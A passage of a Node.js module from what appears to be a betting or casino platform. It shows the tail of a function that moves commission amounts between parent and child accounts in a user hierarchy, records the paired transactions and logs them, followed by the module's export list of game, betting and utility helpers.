      percentage: level.percentage,
    })),
  });

  // Commission | gtype | marketId | winnat
  const transactionRemark = [
    "Commission",
    bet.gType,
    bet.marketId,
    bet.cresult?.winnat,
  ]
    .filter(
      (value) =>
        value !== undefined &&
        value !== null &&
        String(value).trim() !== ""
    )
    .map((value) => String(value).trim())
    .join(" | ");

  for (const level of hierarchy) {
    const commissionAmount = Number(
      (
        (commissionBase * level.percentage) /
        100
      ).toFixed(2)
    );

    if (commissionAmount <= 0) {
      continue;
    }

    const payer = level.parent;
    const receiver = level.child;

    const payerBefore = await User.findById(payer._id)
      .select("balance")
      .lean();

    const receiverBefore = await User.findById(receiver._id)
      .select("balance")
      .lean();

    if (!payerBefore || !receiverBefore) {
      throw new Error(
        "[Casino Commission] Payer or receiver not found"
      );
    }

    const payerBalanceBefore = Number(
      payerBefore.balance || 0
    );

    const receiverBalanceBefore = Number(
      receiverBefore.balance || 0
    );

    // Deduct from parent
    const updatedPayer =
      await atomicUpdateUserFinance(
        payer._id,
        {
          balance: -commissionAmount,
        },
        {
          session,
          allowNegativeBuffer: false,
        }
      );

    if (!updatedPayer) {
      throw new Error(
        `[Casino Commission] Failed to deduct ${commissionAmount} from ${payer.username}`
      );
    }

    // Credit child
    const updatedReceiver =
      await atomicUpdateUserFinance(
        receiver._id,
        {
          balance: commissionAmount,
        },
        {
          session,
          allowNegativeBuffer: false,
        }
      );

    if (!updatedReceiver) {
      throw new Error(
        `[Casino Commission] Failed to credit ${commissionAmount} to ${receiver.username}`
      );
    }

    await Transaction.create(
      [
        {
          userId: payer._id,
          type: "casino-commission",
          amount: -commissionAmount,
          balanceBefore: payerBalanceBefore,
          balanceAfter: Number(
            updatedPayer.balance || 0
          ),
          createdBy: receiver._id,
          status: "approved",
          remarks: transactionRemark,
        },
        {
          userId: receiver._id,
          type: "casino-commission",
          amount: commissionAmount,
          balanceBefore: receiverBalanceBefore,
          balanceAfter: Number(
            updatedReceiver.balance || 0
          ),
          createdBy: payer._id,
          status: "approved",
          remarks: transactionRemark,
        },
      ],
      session ? { session } : {}
    );

    console.log("[Casino Commission] TRANSFER", {
      betId: bet._id.toString(),
      payer: payer.username,
      receiver: receiver.username,
      percentage: level.percentage,
      commissionBase,
      commissionAmount,
      remark: transactionRemark,
    });
  }

  console.log("[Casino Commission] FINISHED", {
    betId: bet._id.toString(),
  });
};

module.exports = {
  messages,
  SPGroups,
  DPGroups,
  TPList,
  chart64,
  chart56,
  abr,
  commonSP,
  commonDP,
  colorDP,
  generateUUID,
  compareData,
  encryptData,
  decryptData,
  parseArrayIfExist,
  jskDecryptData,
  jskEncryptData,
  encryptPassword,
  decryptPassword,
  comparePassword,
  sleep,
  apiRequest,
  normalizeNat,
  isScoreWin,
  getClientIp,
  rouletteNumbers,
  compareHands,
  parseCardValue,
  mapValueToRank,
  parseCardGroup,
  deleteFile,
  tieGameCondition,
  getCardRanks,
  generateFullDeck,
  checkJokerResult,
  parseMatchDate,
  filterBetsByDate,
  canCreateRole,
  ROLE_HIERARCHY,
  distributeCommissionHierarchy,
  distributeBettingCommissionHierarchy,
  getUserCommissionHierarchyFast,
  cleanUser,
  httpsApiRequest,
  checkPannaType,
  validateStreamParameters,
  atomicUpdateUserBalanceExp,
  distributeCasinoCommissionHierarchy
};
